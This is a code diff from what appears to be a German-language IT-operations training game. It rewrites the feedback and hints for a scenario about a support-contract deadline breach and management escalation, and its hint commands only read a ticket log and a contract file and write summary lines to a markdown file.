+            'Damit lässt sich reden. Die Zahlen stimmen, und sie stimmen in die richtige Richtung: Das Ticket läuft als HOCH, nicht als kritisch — also 24 Stunden, nicht 4. Wer die schärfere Frist nimmt, weil der Fall sich dringlich anfühlt, verliert das Gespräch im ersten Satz.\n\nDer eigentliche Punkt steht unter der Tabelle: Um 08:01 kam eine Antwort, und um 18:00 änderte sich ein Status. Beides hat kein Mensch getan. Der Vertrag schließt genau das aus — sonst könnte jeder Anbieter seine Reaktionszeit mit einem Autoresponder einhalten. Ohne diesen Absatz gäbe es hier keinen Verstoß, sondern eine Reaktion nach einer Minute.\n\nUnd die Folge ist nicht die Gutschrift, die man erwartet: Es ist der dritte Verstoß in diesem Jahr, und dafür sieht der Vertrag die Eskalation an die Geschäftsleitung beider Seiten vor. Das ist ein anderes Gespräch als „zehn Prozent auf die nächste Rechnung" — und es ist das Gespräch, das etwas ändert.',
+          skillGain: { softSkills: 6, troubleshooting: 3, security: 2 },
+          effects: { stress: -2 },
         },
       ],
       hints: [
-        'Tipp: Bevor du dich auf eine Diskussion einlässt — verschaff dir den kompletten Ticket-Verlauf. Wann wurde was zugesagt, wann tatsächlich reagiert?',
-        'Tipp: Sichere die Fakten: Was steht im Support-Vertrag zur Reaktionszeit, und wie dokumentierst du den Verlauf belastbar?',
-        'Tipp: Konkret: cat ticket*.log zeigt den Verlauf, Screenshots sichern die Beweise.',
+        '🤖 Jens: Bevor du mit jemandem über eine Frist streitest, musst du wissen, WELCHE Frist gilt. Die hängt an der Dringlichkeitsstufe, unter der das Ticket eröffnet wurde — nicht daran, wie dringend es sich anfühlt.',
+        '🤖 Jens: Und dann die unangenehme Frage: Hat innerhalb dieser Frist wirklich jemand reagiert? Schau dir an, WER die Einträge im Verlauf erzeugt hat.',
+        '🤖 Jens: Lies den Vertrag bis unter die Tabellen. Da steht, was als Reaktion zählt und was nicht — und ganz unten, wie oft das dieses Jahr schon vorgekommen ist. Die Zahl entscheidet, welche der drei Folgen greift.',
+        '🤖 Jens: Konkret: `cat /var/log/tickets/ticket-2026-03-09-001.log` → `cat /etc/vertragswerk/siemens-premium.txt` → `echo "stufe: hoch" > /home/operator/eskalation.md` → `echo "frist: 24" >> /home/operator/eskalation.md` → `echo "technische_reaktion: keine" >> /home/operator/eskalation.md` → `echo "verstoss: ja" >> /home/operator/eskalation.md` → `echo "folge: eskalation" >> /home/operator/eskalation.md`.',
       ],
     },
   },
-
-  // ============================================
-  // COMPLIANCE SCENARIOS
-  // ============================================
   {
     id: 'KRITIS-SC-008',
     title: 'BSI-Audit steht bevor',
